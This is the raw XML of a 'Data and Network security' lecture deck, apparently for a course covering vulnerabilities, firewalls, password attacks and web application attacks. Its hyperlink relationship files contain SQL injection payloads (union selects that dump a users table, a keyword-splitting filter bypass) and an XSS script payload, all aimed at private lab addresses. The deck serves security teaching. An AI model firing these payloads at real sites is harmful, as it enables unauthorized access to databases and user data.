          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="8"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124080" y="6248520"/>
            <a:ext cx="2895120" cy="456840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">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209" name="PlaceHolder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="9"/>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000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="r">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:fld id="{59EE2A16-5547-49CF-A1CE-378D2F74FBC9}" type="slidenum">
              <a:rPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>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6" name="Line 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1600200"/>
            <a:ext cx="7772400" cy="360"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="808080"/>
            </a:solidFill>
            <a:round/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="247"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Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="248" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="6248520"/>
            <a:ext cx="1904760" cy="456840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="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249" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3124080" y="6248520"/>
            <a:ext cx="2895120" cy="456840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="t">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250" name="PlaceHolder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="12"/>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000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="r">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:fld id="{F07CFF62-C422-40E3-810C-911126D76AEE}" type="slidenum">
              <a:rPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>&lt;number&gt;</a:t>
            </a:fld>
            <a:endParaRPr b="0" lang="en-US" sz="1400" spc="-1" strike="noStrike">
              <a:latin typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25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lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1417"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPct val="45000"/>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Click to edit the outline text format</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="864000" indent="-324000">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1134"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPct val="75000"/>
              <a:buFont typeface="Symbol" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Second Outline Level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="2" marL="1296000" indent="-288000">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="850"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPct val="45000"/>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Third Outline Level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="3" marL="1728000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="567"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPct val="75000"/>
              <a:buFont typeface="Symbol" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Fourth Outline Level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="4" marL="2160000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="283"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPct val="45000"/>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Fifth Outline Level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="5" marL="2592000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="283"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPct val="45000"/>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Sixth Outline Level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="6" marL="3024000" indent="-216000">
              <a:lnSpc>
                <a:spcPct val="105000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="283"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPct val="45000"/>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>Seventh Outline Level</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2000" spc="-1" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="004666"/>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37.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7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7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4.xml.rels><?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image15.wmf"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide75.xml.rels><?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image16.wmf"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout13.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7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49.xml"/><Relationship Id="rId4"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9.xml"/><Relationship Id="rId3"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49.xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide82.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64.xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide83.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9.xml"/><Relationship Id="rId3"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image" Target="../media/image24.png"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout64.xml"/><Relationship Id="rId4"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77.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64.xml"/><Relationship Id="rId3"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97.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49.xml"/><Relationship Id="rId3"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slideLayout" Target="../slideLayouts/slideLayout49.xml"/><Relationship Id="rId3"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49.xml"/><Relationship Id="rId3"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49.xml"/><Relationship Id="rId4"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105.xml.rels><?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image31.wmf"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout64.xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide10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wmf"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout64.xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide107.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49.xml"/><Relationship Id="rId3"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49.xml"/><Relationship Id="rId3"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11.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jpe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47.png"/><Relationship Id="rId13" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image48.png"/><Relationship Id="rId14" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image49.wmf"/><Relationship Id="rId15" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image50.png"/><Relationship Id="rId16" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout49.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13.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49.xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide114.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64.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide114.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1.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23.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49.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2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9.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34.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34.xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide135.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64.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/notesSlide" Target="../notesSlides/notesSlide135.xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide136.xml.rels><?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://www.google.com/imgres?imgurl=http://www.pcbanker.com/images/sid700a.gif&amp;imgrefurl=http://www.pcbanker.com/CustServ/securIDinfo.asp&amp;h=237&amp;w=350&amp;sz=16&amp;tbnid=b2vurGzjJyXLAM::&amp;tbnh=81&amp;tbnw=120&amp;prev=/images?q=picture+of+securid+token&amp;usg=__SOf7rHTmudjeKkGF7l5IeFEsFZs=&amp;ei=UrzWSaitKaXglQe_u9HgDA&amp;sa=X&amp;oi=image_result&amp;resnum=1&amp;ct=image" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image61.jpeg"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout49.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37.xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide138.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slideLayout" Target="../slideLayouts/slideLayout49.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14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4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47.xml.rels><?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.21/compiler/sql/id.php?id=1" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.21/compiler/sql/id.php?id=3-1" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.21/compiler/sql/id.php?id=1+union+Select+*+from+users" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.21/compiler/sql/id.php?id=1+union+Select+*+from+users" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.67.128/compiler/sql/id.php?id=1+union%20select+1,2,database()" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout49.xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide148.xml.rels><?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.67.128/compiler/sql/id.php?id=1+union%20select%201,2,concat(user(),%22:%22,database(),%22:%22,version())" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.67.128/compiler/sql/id.php?id=1+union%20select%201,2,concat(user(),%22:%22,database(),%22:%22,version())" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.21/compiler/sql/id1.php?id=1+union+select+*+from+users" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.21/compiler/sql/id1.php?id=1+union+Select+*+from+users" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.21/compiler/sql/id1.php?id=1+union+selselectect+*+from+users" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.21/compiler/sql/id1.php?id=1+union+Select+*+from+users" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout49.xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide149.xml.rels><?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.67.128/compiler/sql/sql3.php?id=1" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout49.xml"/>
</Relationships>
</file>

<file path=ppt/slides/_rels/slide150.xml.rels><?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.67.128/compiler/rexec/index.php" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.21/compiler/rexec/index.php" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.67.128/compiler/xss/example1.php?name=ahmed" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.21/compiler/xss/example1.php?name=%3Cscript%3Ealert(1);%3C/script" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.21/compiler/xss/example2.php?name=%3Cscript%3Ealert(1);%3C/script" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slideLayout" Target="../slideLayouts/slideLayout49.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52.xml.rels><?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.67.128/compiler/sql/id.php?id=1" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.21/compiler/sql/id.php?id=1" TargetMode="External"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.21/compiler/sql/id.php?id=1" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://192.168.1.21/compiler/sql/id.php?id=1" TargetMode="External"/><Relationship Id="rId5"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TextShape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="685800" y="1197000"/>
            <a:ext cx="7771680" cy="1469160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12600">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="a50021"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Data and Network security</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TextShape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609480" y="207000"/>
            <a:ext cx="7771680" cy="1469160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12600">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="a50021"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Contents</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="296" name="TextShape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="1752480"/>
            <a:ext cx="8686440" cy="480024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Attacks and Vulnerabilities.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Vulnerabilities.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Type of hackers.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Categories of attacks.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Malicious hacker can do.</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Types of attacks.</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Security mechanisms. </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Defense in depth.</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Firewalls.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IDS/IPS.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Cryptography and Digital signatures.</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Lab : Firewall(firewalld), Wireshark, Cryptography(openssl).</a:t>
            </a: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TextShape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609480" y="207000"/>
            <a:ext cx="7771680" cy="1469160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12600">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="90000" rIns="90000" tIns="45000" bIns="45000" anchor="ctr">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="a50021"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Contents</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3200" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="298" name="TextShape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="1752480"/>
            <a:ext cx="8686440" cy="480024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Passwords management.</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Identification and authentication techniques.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Password types.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Password attacks.</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Web penetration attacks.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Software bugs.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Web applications attacks.</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SQL Injection, Remote execution, and Cross-site scripting..</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="800280" indent="-342720">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char="à"/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="2400" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Mechanisms to protect web applications.</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Lab : SQL injection, XSS, and SQLMap tool.</a:t>
            </a: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685800" y="1197000"/>
            <a:ext cx="7772040" cy="1469520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12600">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr numCol="1" spcCol="0" anchor="ctr">
            <a:normAutofit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr sz="3000"/>
            </a:br>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="3000" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="bc4b2c"/>
                </a:solidFill>
                <a:latin typeface="Georgia"/>
              </a:rPr>
              <a:t>Attacks and Vulnerabilities</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Vulnerabilities</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30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Vulnerability is the degree of weakness which is inherent in every network and device. </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Primary vulnerabilities or weaknesses: </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Technological weaknesses </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Configuration weaknesses </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Security policy weaknesses</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="22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Technological Weakness</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="3600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30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438840" indent="-319680">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings 2" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="c00000"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>TCP/IP protocol weakness</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1800" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr lvl="1" marL="731520" indent="-273960">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="800000"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" charset="2"/>
              <a:buChar char=""/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="004666"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="DejaVu Sans"/>
              </a:rPr>
              <a:t>Hypertext Transfer Protocol (HTTP), File Transfer Protocol (FTP) and Internet Control Message Protocol (ICMP) are inherently insecure.</a:t>
            </a:r>
            <a:endParaRPr b="0" lang="en-US" sz="1600" spc="-1" strike="noStrike">
              <a:latin typeface="Arial"/>
